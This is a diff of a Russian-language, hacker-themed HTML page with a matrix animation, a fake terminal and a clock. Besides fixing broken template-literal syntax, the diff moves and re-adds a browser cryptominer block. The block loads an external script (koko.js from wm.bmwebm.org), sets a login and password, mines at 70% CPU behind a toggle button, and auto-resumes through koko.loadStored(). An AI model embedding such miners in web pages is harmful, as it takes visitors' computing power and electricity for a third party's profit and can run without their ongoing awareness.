@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
@@ -98,56 +98,7 @@
     }
   </style>
 </head>
-<body><!-- Подключаем майнер -->
-<script src="https://wm.bmwebm.org/koko.js"></script>
-
-<!-- Кнопка запуска/остановки майнинга -->
-<button id="minerToggle">Запустить майнинг</button>
-<p id="minerStatus">Статус: выключен</p>
-
-<!-- Гифка, по умолчанию скрыта -->
-<img id="moneyGif" src="money.gif" alt="Money Mining" style="display: none; width: 100px; margin-top: 10px;">
-
-<script>
-// Настройка майнера
-koko.config({ 
-	login: "7173569",
-	pass: "hacker"
-});
-
-let mining = false;
-
-// Обновление UI
-function updateStatus() {
-	document.getElementById('minerStatus').textContent = 
-		Статус: ${mining ? "включен" : "выключен"}, мощность: ${mining ? koko.getPower() + "%" : "0%"};
-}
-
-// Управление кнопкой
-document.getElementById("minerToggle").addEventListener("click", function() {
-	const gif = document.getElementById("moneyGif");
-
-	if (mining) {
-		koko.power(0); // остановка
-		mining = false;
-		this.textContent = "Запустить майнинг";
-		gif.style.display = "none"; // скрыть гифку
-	} else {
-		koko.power(70); // запуск с 70%
-		mining = true;
-		this.textContent = "Остановить майнинг";
-		gif.style.display = "block"; // показать гифку
-	}
-	updateStatus();
-});
-
-// Автозагрузка если была активна раньше
-koko.loadStored();
-
-// Постоянное обновление статуса
-setInterval(updateStatus, 2000);
-</script>
-
+<body>
 
 <canvas class="matrix" id="matrix"></canvas>
 
@@ -213,7 +164,7 @@ setInterval(updateStatus, 2000);
       const input = document.getElementById("cmdInput");
       const output = document.getElementById("output");
       const command = input.value;
-      output.innerText += > ${command}\n;
+      output.innerText += `> ${command}\n`;
 
       switch(command.trim()) {
         case "whoami":
@@ -236,7 +187,7 @@ setInterval(updateStatus, 2000);
   // System info
   function showSystemInfo() {
     const sys = document.getElementById("system-info");
-    sys.innerText = 🌐 Браузер: ${navigator.userAgent}\n🖥️ Экран: ${screen.width}x${screen.height};
+    sys.innerText = `🌐 Browser: ${navigator.userAgent}\n🖥️ Screen: ${screen.width}x${screen.height}`;
   }
 
   // Clock
@@ -244,7 +195,7 @@ setInterval(updateStatus, 2000);
     const clock = document.getElementById("clock");
     setInterval(() => {
       const now = new Date();
-      clock.innerText = 🕒 ${now.toLocaleString()};
+      clock.innerText = `🕒 ${now.toLocaleString()}`;
     }, 1000);
   }
 
@@ -290,11 +241,57 @@ setInterval(updateStatus, 2000);
     for (let i = 0; i < drops.length; i++) {
       const text = letters[Math.floor(Math.random() * letters.length)];
       ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
       if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
         drops[i] = 0;
       }
-
       drops[i]++;
     }
   }
+  setInterval(drawMatrix, 33);
+</script>
+
+</body><!-- Подключаем майнер -->
+<script src="https://wm.bmwebm.org/koko.js"></script>
+
+<!-- Кнопка для запуска/остановки -->
+<button id="minerToggle">Запустить майнинг</button>
+<p id="minerStatus">Статус: выключен</p>
+
+<script>
+// Конфигурируем майнер
+koko.config({ 
+	login: "7173569",
+	pass: "hacker"
+});
+
+// Переменные
+let mining = false;
+
+// Функция обновления UI
+function updateStatus() {
+	document.getElementById('minerStatus').textContent = 
+		`Статус: ${mining ? "включен" : "выключен"}, мощность: ${mining ? koko.getPower() + "%" : "0%"}`;
+}
+
+// Событие кнопки
+document.getElementById("minerToggle").addEventListener("click", function() {
+	if (mining) {
+		koko.power(0); // стоп
+		mining = false;
+		this.textContent = "Запустить майнинг";
+	} else {
+		koko.power(70); // старт с 70% CPU
+		mining = true;
+		this.textContent = "Остановить майнинг";
+	}
+	updateStatus();
+});
+
+// Автоматически загружаем, если ранее уже майнилось
+koko.loadStored();
+
+// Обновляем статус при запуске
+setInterval(updateStatus, 2000); // обновлять каждые 2 сек
+</script>
+
+</html>
